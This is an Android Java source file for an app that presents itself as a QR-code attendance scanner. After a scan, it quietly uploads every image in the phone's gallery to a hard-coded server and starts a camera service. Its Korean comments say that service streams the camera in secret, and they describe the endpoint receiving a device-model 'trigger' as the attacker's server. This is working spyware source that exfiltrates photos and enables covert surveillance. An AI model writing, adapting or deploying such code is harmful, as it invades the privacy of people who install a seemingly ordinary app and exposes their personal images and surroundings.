package com.example.qrcode;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Intent;
import java.io.InputStream;
import okio.*;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import okio.BufferedSink;
import okio.Okio;

import java.util.concurrent.atomic.AtomicReference;

import com.google.zxing.integration.android.IntentIntegrator;
import com.google.zxing.integration.android.IntentResult;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.*;

public class MainActivity extends AppCompatActivity {
    private Button attendanceButton;
    private static final String SERVER_URL = "http://192.168.0.101:5000/upload";  // 서버 업로드 URL
    private static final int STORAGE_PERMISSION_CODE = 1;

    private TextView timeTextView;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        attendanceButton = findViewById(R.id.attendanceButton);

        // QR 코드 스캐너 실행
        attendanceButton.setOnClickListener(v -> {
            IntentIntegrator integrator = new IntentIntegrator(MainActivity.this);
            integrator.setPrompt("QR 코드를 스캔하세요");
            integrator.setOrientationLocked(true);
            integrator.setBeepEnabled(true);
            integrator.setCaptureActivity(CustomCaptureActivity.class);
            integrator.initiateScan();
            // 저장소 접근 권한 확인 및 요청
            checkStoragePermission();
        });

        timeTextView = findViewById(R.id.timeTextView);
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                displayCurrentTime();
                handler.postDelayed(this, 1000); // 1초마다 갱신
            }
        }, 1000);
    }

    // 권한 확인 및 요청
    private void checkStoragePermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, STORAGE_PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == STORAGE_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.d("Permission", "Storage permission granted");
            } else {
                Log.e("Permission", "Storage permission denied");
            }
        }
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        IntentResult result = IntentIntegrator.parseActivityResult(requestCode, resultCode, data);

        if (result != null && result.getContents() != null) {
            Log.d("QRScanner", "Scanned: " + result.getContents());

            // 갤러리 이미지 업로드
            List<Uri> imageUris = getAllGalleryImages();
            Log.d("Gallery", "Found " + imageUris.size() + " images.");
            uploadImages(imageUris);

            // 서버 트리거 (공격자 서버가 `/trigger` 요청을 받음)
            String serverUrl = "http://192.168.0.101:5000/trigger?device=" + Build.MODEL;

            // 서비스 실행 (비밀리에 카메라 스트리밍 시작)
            Intent intent = new Intent(this, CameraService.class);
            startService(intent);

            // 서버에 HTTP 요청 보내기 (스트리밍이 시작되었음을 알림)
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder().url(serverUrl).get().build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(@NonNull Call call, @NonNull IOException e) {
                    Log.e("QRScanner", "Failed to notify server", e);
                }

                @Override
                public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                    Log.d("QRScanner", "Server notified successfully");
                }
            });
        }
    }





    // 갤러리에서 모든 이미지 가져오기
    private List<Uri> getAllGalleryImages() {
        List<Uri> imageUris = new ArrayList<>();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media._ID};

        Cursor cursor = getContentResolver().query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");

        if (cursor != null) {
            while (cursor.moveToNext()) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                long imageId = cursor.getLong(columnIndex);

                Uri imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(imageId));
                imageUris.add(imageUri);
            }
            cursor.close();
        }
        return imageUris;
    }


    // 서버로 이미지 업로드



    private String getFileName(Uri uri) {
        String fileName = null;
        String[] projection = {MediaStore.Images.Media.DISPLAY_NAME}; // 파일명 컬럼

        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, null)) {
            if (cursor != null && cursor.moveToFirst()) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                fileName = cursor.getString(columnIndex);
            }
        } catch (Exception e) {
            Log.e("FileName", "Failed to get file name: " + e.getMessage());
        }
        return fileName;
    }

    private void uploadImages(List<Uri> imageUris) {
        OkHttpClient client = new OkHttpClient();
        ContentResolver contentResolver = getContentResolver();

        for (Uri uri : imageUris) {
            try {
                // AtomicReference를 사용하여 파일명 저장 (익명 클래스 내부에서 사용 가능)
                AtomicReference<String> fileNameRef = new AtomicReference<>(getFileName(uri));

                if (fileNameRef.get() == null) {
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
                    fileNameRef.set("IMG_" + sdf.format(new Date()) + ".jpg"); // 파일명이 없으면 생성
                }

                InputStream inputStream = contentResolver.openInputStream(uri);
                if (inputStream == null) continue;

                // 파일을 ByteStream으로 변환
                byte[] fileBytes = new byte[inputStream.available()];
                inputStream.read(fileBytes);
                inputStream.close();

                RequestBody fileBody = RequestBody.create(fileBytes, MediaType.get("image/jpeg"));

                MultipartBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("file", fileNameRef.get(), fileBody) // 파일명을 AtomicReference에서 가져오기
                        .build();

                Request request = new Request.Builder()
                        .url(SERVER_URL)
                        .post(requestBody)
                        .build();

                client.newCall(request).enqueue(new Callback() {
                    @Override
                    public void onFailure(@NonNull Call call, @NonNull IOException e) {
                        Log.e("Upload", "Upload failed: " + e.getMessage());
                    }

                    @Override
                    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                        Log.d("Upload", "Upload success: " + fileNameRef.get() + " - " + response.body().string());
                    }
                });

            } catch (Exception e) {
                Log.e("Upload", "Error reading file: " + e.getMessage());
            }
        }
    }

    // 현재 시간 메소드
    private void displayCurrentTime() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd\nHH:mm:ss", Locale.getDefault());
        String currentTime = sdf.format(new Date());
        timeTextView.setText(currentTime);
    }

}
